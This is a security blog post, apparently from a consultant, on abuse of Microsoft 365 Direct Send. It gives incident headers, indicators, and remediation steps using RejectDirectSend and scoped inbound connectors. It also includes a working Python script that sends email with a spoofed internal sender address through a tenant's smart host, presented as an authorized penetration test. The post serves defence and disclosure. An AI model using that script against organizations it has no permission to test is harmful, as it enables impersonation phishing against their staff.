---
title: "M365 Direct Send Abuse - What Happens When the Feature Is the Vulnerability"
date: 2026-03-23
description: "Direct Send is a Microsoft 365 feature designed to let printers send email. It also lets anyone on the internet impersonate your users, bypass your MX security gateway, and land in the inbox all without credentials, a CVE, or a compromised account. And it's enabled by default."
categories:
  - Case Studies
  - Security Research
  - Email Security

tags:
  - Phishing
  - Social Engineering
  - Defense
  - PowerShell
  - Windows
  - Policy
  - Threat Intelligence
  - Threat Research
  - Current Events
  - Vulnerability Management
pin: true
---

There's a specific kind of vulnerability that unsettles even the most seasoned security engineer. The kind that lets any bored "computer enthusiast" with time on their hands bypass every control in your stack, despite your best attempts at defense in depth. No CVE. No zero-day. No compromised account. It's insecure by design.

That is the nature of Microsoft 365 DirectSend abuse. When the vulnerability is the feature, there is no CVE to track and no patch to wait for. Microsoft has only recently begun to address it, despite the underlying service being exposed for years.

DirectSend abuse exposes a gap that exists not because of misconfiguration, but because of design. It allows unauthenticated messages to be delivered through Microsoft's infrastructure in a way that can bypass key email security controls and be treated as internal traffic.

What makes this particularly dangerous is the level of trust and believability it presents to an end user. Traditional spoofing techniques often introduce indicators users are trained to question, such as altered domains, external sender banners, or gateway warnings. DirectSend abuse removes many of those signals. Messages can arrive through trusted infrastructure without the routing indicators that typically expose a spoof.

This creates a scenario where attackers can send messages that appear to originate from internal users or trusted roles while passing basic trust checks. The effectiveness of the attack is not driven by sophisticated social engineering. The delivery path is the credibility.

This post examines how DirectSend is abused, why mature email security postures still leave organizations exposed, and how default configurations create the gap. It includes authorized proof of concept testing and the remediation steps defenders can use to close it. The broader question it tries to answer is harder: when the vulnerability is the feature and no fix exists, how reading your own documentation from an attacker's perspective is the foundation of proactive security and finding the gaps your controls were never built to see.
---

## The Threat Landscape

This is not a new technique, but it has had a very active year. Starting in May 2025, multiple threat research teams independently documented ongoing campaigns abusing Direct Send to deliver phishing that looks like it came from inside the target organization. Over 70 organizations confirmed affected, 95% US-based, hitting financial services, healthcare, manufacturing, and construction hardest. What makes it stick is the simplicity. 

| Metric | Value |
|---|---|
| Campaign start | May 2025 |
| Organizations targeted (confirmed) | 70+ |
| US-based victims | ~95% |
| Primary verticals | Financial Services, Healthcare, Manufacturing, Construction |
| CVE assigned | None -- abuse of a legitimate feature |

*Source: [Varonis Threat Labs -- Ongoing Campaign Abuses Microsoft 365's Direct Send to Deliver Phishing Emails](https://www.varonis.com/blog/direct-send-exploit)*

---

## How Direct Send Works (and Why It's a Problem)

Direct Send is a Microsoft 365 feature designed for internal devices like printers, copiers, and legacy LOB applications that cannot support modern authentication. Rather than routing through OAuth or SMTP AUTH, these devices connect directly to the tenant's smart host at `<tenant>.mail.protection.outlook.com` on port 25 and submit mail unauthenticated, with no credentials, no token, and no prior relationship with the tenant required.

The endpoint is publicly reachable. Any host on the internet can connect to it, present any `MAIL FROM` address using your domain, and submit a message. Exchange Online accepts the submission, classifies it as internal routing, and delivers it. The message never touches your MX gateway.

That classification is where the problem lives. Exchange Online stamps the message `InternalOrgSender: True` before it enters the filtering stack. By the time anti-spam and anti-phishing controls evaluate it, the message already carries internal trust attribution. SPF fires against the submitting IP and fails or softfails, but enforcement is downstream of that classification. DKIM is absent, but absence is not treated as failure across all pipeline paths. DMARC may quarantine but rarely stops delivery when the message is processed as an internal relay. The auth controls behave exactly as designed. They just were not designed for this delivery path.

*Source: [Microsoft Learn -- Direct Send: Send Mail Directly From Your Device or Application](https://learn.microsoft.com/en-us/exchange/mail-flow-best-practices/how-to-set-up-a-multifunction-device-or-application-to-send-email-using-microsoft-365-or-office-365)*

### The Attack Path

| Step | Action | Detail |
|---|---|---|
| 1 | Reconnaissance | Attacker finds valid recipients via OSINT, LinkedIn, or prior breach data |
| 2 | Connection | Connects directly to `<tenant>.mail.protection.outlook.com:25`, bypassing any third-party MX gateway entirely |
| 3 | Delivery | Submits email with spoofed `From` address, no credentials. Microsoft stamps it `InternalOrgSender: True` and delivers. |

The MX bypass is the part worth dwelling on. Most organizations route inbound mail through a third-party gateway (Mimecast, Proofpoint, etc.) by pointing their MX record at it. That gateway scans everything it sees. Direct Send does not go through the MX record. The attacker connects directly to Microsoft's SMTP frontend. Your security gateway never gets a look at the message.

### Why SPF, DKIM, and DMARC Do Not Save You Here

This is the part that surprises people, because on paper these organizations have their email auth configured.

| Protocol | What Happens | Why It Does Not Block |
|---|---|---|
| SPF | SoftFail or Fail | `~all` flags but does not reject. Even `-all` does not stop Direct Send because Microsoft processes this as internal routing before SPF enforcement applies. |
| DKIM | None -- not signed | No private key to sign an unauthenticated submission. Absence of a signature is not the same as a failed signature in all pipeline paths. |
| DMARC | Fail | `p=quarantine` holds the message in some cases but does not prevent delivery when Direct Send routes it as internal. And plenty of tenants never made it to `p=reject`. |

So you get a message that fails every auth check, arrives in the inbox, and gets stamped by Microsoft's own headers as coming from inside the organization. End users see no external sender warning. It looks like a colleague.

---


## The Incident: What the Headers Showed

This vulnerability first came to my attention when a client forwarded me an emailthey recieved appearing as if it was from themselves forwarding a link to "Chase Bank". Once I had the full headers, the story was immediate.

**Microsoft's own label for unauthenticated delivery:**

```
X-MS-Exchange-Organization-IsAnonymousDirectSend: True
```

**The full auth failure chain:**

```
spf=softfail (sender IP is [EXTERNAL-IP]) smtp.mailfrom=[CLIENT-DOMAIN]
dkim=none (message not signed) header.d=none
dmarc=fail action=quarantine
compauth=none reason=451
```

**The internal trust stamp applied to an externally-sourced, unauthenticated message:**

```
X-MS-Exchange-Organization-InternalOrgSender: True
```

**The delivery path: external IP presenting a spoofed loopback EHLO:**

```
Received: from [127.0.0.1] ([EXTERNAL-IP]) by [TENANT].mail.protection.outlook.com
```

**MX bypass confirmed:**

```
X-MS-Exchange-Organization-MxPointsToUs: false
```

**Payload obfuscated behind a Google open redirect:**

```
Persisted-Urls: https://google.[TLD]/url?q=https://[MALICIOUS-DOMAIN].icu
```

**Microsoft's ML stack flagged it. Delivered anyway.**

```
MMH_L=PHISH
BIMP_SHARED_SU_KEY=Chase
```

### IOC Summary (Anonymized)

| Indicator | Value | Significance |
|---|---|---|
| Attacker IP | `[EXTERNAL-IP]` | No reverse DNS, unaffiliated infrastructure |
| Phishing domain | `[MALICIOUS-DOMAIN].icu` | Credential harvesting page |
| Redirect | `google.[TLD]/url?q=...` | Open redirect to bypass URL reputation |
| EHLO | `[127.0.0.1]` | Spoofed loopback -- Direct Send signature |
| Delivery route | `[TENANT].mail.protection.outlook.com` | Bypassed MX gateway entirely |


---

## Proof of Concept: Authorized Testing

> **Authorization Notice:** The following testing was conducted with explicit written authorization against the client's own tenant. Run this only against systems you own or have explicit written permission to test.

If available to you, Azure Cloud Shell wil have no restrictions on port 25 and from Microsoft's perspective, an Azure egress IP is as external and unauthenticated as any other. That makes it a realistic simulation of what the attacker did from their VPS.

### Step 1: Confirm Port 25 is Reachable

```python
python3 -c "
import socket
try:
    s = socket.create_connection(
        ('[TENANT].mail.protection.outlook.com', 25), timeout=10)
    print('[+] Port 25 OPEN')
    print(f'[+] Banner: {s.recv(1024).decode().strip()}')
    s.close()
except Exception as e:
    print(f'[-] Blocked: {e}')
"
```

Result:

```
[+] Port 25 OPEN
[+] Banner: 220 SJ5PEPF000001F2.mail.protection.outlook.com
    Microsoft ESMTP MAIL Service ready at Wed, 25 Mar 2026 02:15:27 +0000
```

Microsoft's SMTP frontend is up, responding, and not asking for credentials.

### Step 2: Send the Spoofed Email From External IP

```python
python3 << 'EOF'
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime

#connect to the target's smart host and choose the intended spoofee
smart_host = "[TENANT].mail.protection.outlook.com"
from_addr  = "[TARGET-USER]@[CLIENT-DOMAIN]"
to_addr    = "[TARGET-USER]@[CLIENT-DOMAIN]"

#customize message subject and body for own needs, ticket number reference ect..
msg = MIMEMultipart()
msg['Subject'] = f"AUTHORIZED PENTEST - Direct Send Simulation {datetime.now().strftime('%m/%d/%Y %H:%M')}"
msg['From']    = from_addr
msg['To']      = to_addr

body = MIMEText("""
AUTHORIZED Direct Send abuse simulation.
- Method : Unauthenticated SMTP via Direct Send smart host
- Ref     : PENTEST-DIRECTSEND-001
""")
msg.attach(body)

#output message upon success/failed connection
try:
    s = smtplib.SMTP(smart_host, 25, timeout=20)
    s.ehlo("localhost")
    s.sendmail(from_addr, [to_addr], msg.as_string())
    s.quit()
    print("[!!!] SUCCESS - EMAIL SENT")
    print("[!!!] TENANT IS VULNERABLE")
except smtplib.SMTPRecipientsRefused as e:
    print(f"[+] SMTP REJECTION: {e}")
    print("    >> RejectDirectSend is active -- PROTECTED")
except Exception as e:
    print(f"[-] {type(e).__name__}: {e}")
EOF
```

Result:

```
[+] Connected successfully
[!!!] SUCCESS - EMAIL SENT
[!!!] TENANT IS VULNERABLE
```

The full test script is available in my [tools and methodologies repository](https://github.com/sireton/tools-methodologies/blob/Practice/Tools/vuln%20testing/Exchange%20Direct%20Send%20Attack).

---

## Remediation and Hardening

### Should Your Environment Even Use Direct Send?

Before jumping to remediation and before you touch `RejectDirectSend`, this is the question worth sitting with. Because if you disable it without knowing what depends on it, you will find out the hard way when someone's scanner stops emailing PDFs to the accounting team.

The legitimate use cases are real:

| Use Case | What to Do Instead |
|---|---|
| Network printers / MFPs | Scope to a static IP via a scoped inbound connector, or migrate to SMTP AUTH with a service account |
| Legacy LOB apps | Authenticated SMTP or Microsoft Graph API if the app supports it; scoped connector if not |
| Monitoring and alerting systems | Dedicated mailbox with OAuth, or authenticated relay |
| On-premises servers | Authenticated connector or modern auth migration |
| Third-party SaaS sending on your behalf | Add to SPF, configure DKIM in the vendor platform, verify DMARC alignment |

If you have any of these, the path is: audit your inbound connectors, identify what is actually using Direct Send, scope those to specific static IPs via dedicated connectors, then enable `RejectDirectSend` globally. The connectors with scoped IPs will still work. Everything else gets a 554.

```powershell
# See what you are working with
Get-InboundConnector | Select Name, SenderIPAddresses, RequireTls
```

### Work Around: Scope Inbound Connectors to Static IPs

For any legitimate Direct Send dependency, create a scoped connector. One connector handles multiple IPs or CIDR ranges, no need for one per device.

```powershell
New-InboundConnector -Name "AuthorizedDeviceRelay" `
  -ConnectorType OnPremises `
  -SenderIPAddresses @(
      "[DEVICE-IP-1]",
      "[DEVICE-IP-2]",
      "[SITE-SUBNET]/24"
  ) `
  -RequireTls $true `
  -RestrictDomainsToIPAddresses $true

```


If you genuinely have no dependency on Direct Send, no printers, no old apps, no scanners using it, just enable the setting and move on. You are done with this attack vector in one command.

---

### Enable RejectDirectSend

Microsoft released the fix, RejectDirectSend, in April 2025. The campaign started in May. That one-month window tells you everything about how quickly attackers read release notes. This is the only control that actually closes the vector. 

```powershell
#Enable Reject Direct Send
Set-OrganizationConfig -RejectDirectSend $true

# Verify
Get-OrganizationConfig | Select RejectDirectSend

# Expected: True
```

> **Note:** The parameter lives on `Set-OrganizationConfig`, not `Set-TransportConfig`. `Set-TransportConfig` will throw a `NamedParameterNotFound` error regardless of your module version.

*Source: [Microsoft Exchange Team -- Introducing More Control Over Direct Send in Exchange Online](https://techcommunity.microsoft.com/blog/exchange/introducing-more-control-over-direct-send-in-exchange-online/4408790)*

After enabling, re-run the PoC. You should get:

```
550 5.7.68 TenantInboundAttribution; Direct Send not allowed for this organization from unauthorized sources
```


---

## Closing Analysis

The question this investigation keeps returning to is not technical. Every header in this email told the correct story. SPF fired. DKIM was absent. DMARC said quarantine. Microsoft's own ML pipeline flagged brand impersonation. The security gateway would have caught it, if it had ever seen the message. None of those controls failed. The architecture failed, because no one had closed the gap between where external filtering ends and where unauthenticated internal delivery begins.

That gap has a name and a fix. `RejectDirectSend` has existed since April 2025. It ships off. The campaign started in May 2025, the month after the control dropped. The organizations targeted through the rest of that year were not organizations without security programs. They were organizations where that one toggle had not been flipped.

The risk that is hardest to defend against is the one that does not look like a risk. When the vulnerability is built into the feature, there is no CVE to track and no patch to wait for. Some of the most exploitable gaps ship in the documentation, enabled by default, and wait. `RejectDirectSend` took years to arrive. The organizations that avoided this exposure in the interim were not better resourced. They were asking different questions about what their stack permitted.

Understanding what a feature exposes starts with reading the documentation the way an attacker would. That perspective, approaching configuration reviews and default settings with an eye toward what can be abused rather than what is intended, is where gaps like this become visible before they become incidents. Periodic audits of connector permissions, mail flow rules, and authentication enforcement surface permissive behavior that rarely triggers an alert but sits open for years. When a native control does not exist, that same offensive lens drives the search for compensating controls: what signals does the abuse leave behind, what existing controls can be repositioned to act on them, and what does enforcement look like before the vendor catches up. Features that hide risk under legitimate functionality will always exist. The defenders who find them first are the ones who learned to read their own architecture the way an attacker reads a target.

---

## References

- [Varonis Threat Labs -- Ongoing Campaign Abuses Microsoft 365's Direct Send to Deliver Phishing Emails](https://www.varonis.com/blog/direct-send-exploit)
- [Proofpoint -- Attackers Exploit M365 for Internal Phishing](https://www.proofpoint.com/us/blog/email-and-cloud-threats/attackers-abuse-m365-for-internal-phishing)
- [Mimecast Threat Intelligence -- Microsoft Direct Send Abuse](https://www.mimecast.com/threat-intelligence-hub/microsoft-direct-send-abuse)
- [Barracuda Networks -- Microsoft Direct Send Phishing Attacks Explained](https://blog.barracuda.com/2025/08/04/securing-microsoft-direct-send)
- [BleepingComputer -- Microsoft 365 Direct Send Abused to Send Phishing as Internal Users](https://www.bleepingcomputer.com/news/security/microsoft-365-direct-send-abused-to-send-phishing-as-internal-users/)
- [Microsoft Exchange Team -- Introducing More Control Over Direct Send in Exchange Online](https://techcommunity.microsoft.com/blog/exchange/introducing-more-control-over-direct-send-in-exchange-online/4408790)
- [Microsoft -- Direct Send: Send Mail Directly From Your Device or Application](https://learn.microsoft.com/en-us/exchange/mail-flow-best-practices/how-to-set-up-a-multifunction-device-or-application-to-send-email-using-microsoft-365-or-office-365)
- [risk3sixty -- Security Advisory: Microsoft 365 Direct Send Abuse in Active Phishing Campaigns](https://risk3sixty.com/blog/security-advisory-microsoft-365-direct-send-abuse-in-active-phishing-campaigns)
- [Black Arrow Cyber Consulting -- Microsoft 365 Direct Send Abuse Enabling Internal-Appearing Phishing](https://www.blackarrowcyber.com/blog/alert-18-august-2025-direct-send-abuse)
- [Sam Ireton -- Direct Send Test Script](https://github.com/sireton/tools-methodologies/blob/Practice/Tools/vuln%20testing/Exchange%20Direct%20Send%20Attack)
